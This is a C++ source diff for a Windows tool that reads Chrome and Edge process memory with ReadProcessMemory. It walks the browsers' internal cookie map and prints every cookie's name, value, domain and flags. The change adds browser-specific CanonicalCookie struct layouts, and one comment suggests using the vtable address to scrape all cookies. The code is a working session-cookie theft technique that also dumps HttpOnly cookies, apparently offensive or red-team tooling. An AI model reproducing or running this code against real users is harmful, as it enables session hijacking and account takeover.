@@ -20,18 +20,91 @@ struct RemoteString {
     UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
 };
 
-struct CanonicalCookie {
+#pragma region Chrome
+enum class CookieSameSite {
+    UNSPECIFIED = -1,
+    NO_RESTRICTION = 0,
+    LAX_MODE = 1,
+    STRICT_MODE = 2,
+    // Reserved 3 (was EXTENDED_MODE), next number is 4.
+
+    // Keep last, used for histograms.
+    kMaxValue = STRICT_MODE
+};
+
+enum class CookieSourceScheme {
+    kUnset = 0,
+    kNonSecure = 1,
+    kSecure = 2,
+
+    kMaxValue = kSecure  // Keep as the last value.
+};
+
+enum CookiePriority {
+    COOKIE_PRIORITY_LOW = 0,
+    COOKIE_PRIORITY_MEDIUM = 1,
+    COOKIE_PRIORITY_HIGH = 2,
+    COOKIE_PRIORITY_DEFAULT = COOKIE_PRIORITY_MEDIUM
+};
+
+enum class CookieSourceType {
+    // 'unknown' is used for tests or cookies set before this field was added.
+    kUnknown = 0,
+    // 'http' is used for cookies set via HTTP Response Headers.
+    kHTTP = 1,
+    // 'script' is used for cookies set via document.cookie.
+    kScript = 2,
+    // 'other' is used for cookies set via browser login, iOS, WebView APIs,
+    // Extension APIs, or DevTools.
+    kOther = 3,
+
+    kMaxValue = kOther,  // Keep as the last value.
+};
+
+//There is now additional cookie type "CookieBase", but I'm not going to add that here yet
+struct CanonicalCookieChrome {
+    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
     OptimizedString name;
-    OptimizedString value;
     OptimizedString domain;
     OptimizedString path;
     int64_t creation_date;
+    bool secure;
+    bool httponly;
+    CookieSameSite same_site;
+    char partition_key[120];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
+    CookieSourceScheme source_scheme;
+    int source_port;    //Not implemented //End of Net::CookieBase
+    OptimizedString value;
     int64_t expiry_date;
     int64_t last_access_date;
     int64_t last_update_date;
+    CookiePriority priority;       //Not implemented
+    CookieSourceType source_type;    //Not implemented
+};
+
+#pragma endregion
+
+#pragma region Edge
+struct CanonicalCookieEdge {
+    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
+    OptimizedString name;
+    OptimizedString domain;
+    OptimizedString path;
+    int64_t creation_date;
     bool secure;
     bool httponly;
+    CookieSameSite same_site;
+    char partition_key[128];  //Not implemented
+    CookieSourceScheme source_scheme;
+    int source_port;    //Not implemented //End of Net::CookieBase
+    OptimizedString value;
+    int64_t expiry_date;
+    int64_t last_access_date;
+    int64_t last_update_date;
+    CookiePriority priority;       //Not implemented
+    CookieSourceType source_type;    //Not implemented
 };
+#pragma endregion
 
 struct Node {
     uintptr_t left;
@@ -92,12 +165,7 @@ void PrintTimeStamp(int64_t timeStamp) {
         systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
 }
 
-void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr) {
-
-    CanonicalCookie cookie = {0};
-    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookie), nullptr))
-        PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
-
+void PrintValuesEdge(CanonicalCookieEdge cookie, HANDLE hProcess) {
     printf("    Name: ");
     ReadString(hProcess, cookie.name);
     printf("    Value: ");
@@ -120,7 +188,50 @@ void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr) {
     printf("\n");
 }
 
-void ProcessNode(HANDLE hProcess, const Node& node) {
+void PrintValuesChrome(CanonicalCookieChrome cookie, HANDLE hProcess) {
+    printf("    Name: ");
+    ReadString(hProcess, cookie.name);
+    printf("    Value: ");
+    ReadString(hProcess, cookie.value);
+    printf("    Domain: ");
+    ReadString(hProcess, cookie.domain);
+    printf("    Path: ");
+    ReadString(hProcess, cookie.path);
+    printf("    Creation time: ");
+    PrintTimeStamp(cookie.creation_date);
+    printf("    Expiration time: ");
+    PrintTimeStamp(cookie.expiry_date);
+    printf("    Last accessed: ");
+    PrintTimeStamp(cookie.last_access_date);
+    printf("    Last updated: ");
+    PrintTimeStamp(cookie.last_update_date);
+    printf("    Secure: %s\n", cookie.secure ? "True" : "False");
+    printf("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
+
+    printf("\n");
+}
+
+void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, bool isChrome) {
+
+    if (isChrome) {
+        CanonicalCookieChrome cookie = { 0 };
+        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome), nullptr)) {
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            return;
+        }
+        PrintValuesChrome(cookie, hProcess);
+
+    } else {
+        CanonicalCookieEdge cookie = { 0 };
+        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge), nullptr)) {
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            return;
+        }
+        PrintValuesEdge(cookie, hProcess);
+    }
+}
+
+void ProcessNode(HANDLE hProcess, const Node& node, bool isChrome) {
     // Process the current node
     printf("Cookie Key: ");
     ReadString(hProcess, node.key);
@@ -128,13 +239,13 @@ void ProcessNode(HANDLE hProcess, const Node& node) {
 #ifdef _DEBUG
     printf("Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
 #endif
-    ProcessNodeValue(hProcess, node.valueAddress);
+    ProcessNodeValue(hProcess, node.valueAddress, isChrome);
 
     // Process the left child if it exists
     if (node.left != 0) {
         Node leftNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
-            ProcessNode(hProcess, leftNode);
+            ProcessNode(hProcess, leftNode, isChrome);
         else
             PrintErrorWithMessage(TEXT("Error reading left node"));
     }
@@ -143,13 +254,13 @@ void ProcessNode(HANDLE hProcess, const Node& node) {
     if (node.right != 0) {
         Node rightNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
-            ProcessNode(hProcess, rightNode);
+            ProcessNode(hProcess, rightNode, isChrome);
         else
             PrintErrorWithMessage(TEXT("Error reading right node"));
     }
 }
 
-void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress) {
+void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, bool isChrome) {
 
     RootNode cookieMap;
     if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieMap, sizeof(RootNode), nullptr)) {
@@ -175,7 +286,7 @@ void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress) {
     // Process the first node in the binary search tree
     Node firstNode;
     if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
-        ProcessNode(hProcess, firstNode);
+        ProcessNode(hProcess, firstNode, isChrome);
     else
         PrintErrorWithMessage(TEXT("Error reading first node\n"));
 }
